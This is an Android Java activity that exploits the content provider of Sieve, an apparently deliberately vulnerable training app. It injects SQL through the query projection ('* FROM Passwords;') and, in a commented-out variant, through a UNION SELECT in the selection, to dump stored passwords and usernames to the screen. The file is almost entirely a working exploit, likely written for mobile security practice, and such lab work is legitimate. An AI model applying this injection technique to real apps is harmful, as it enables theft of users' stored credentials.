package com.pp.sievesqli;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.database.Cursor;
import android.widget.TextView;

import static android.database.DatabaseUtils.dumpCursorToString;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
		
        Uri targetURI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/");
        //SQLi through projection
		String[] projection = {"* FROM Passwords;"};
        Cursor curs = getContentResolver().query(targetURI, projection, null, null, null);
	
		//SQLi through selection
		//String selection = "1=0) UNION SELECT service,username from Passwords;";
        //Cursor curs = getContentResolver().query(targetURI, null, selection, null, null);
		
        TextView text = (TextView) findViewById(R.id.textView1);
        text.setText(dumpCursorToString(curs));
    }



}
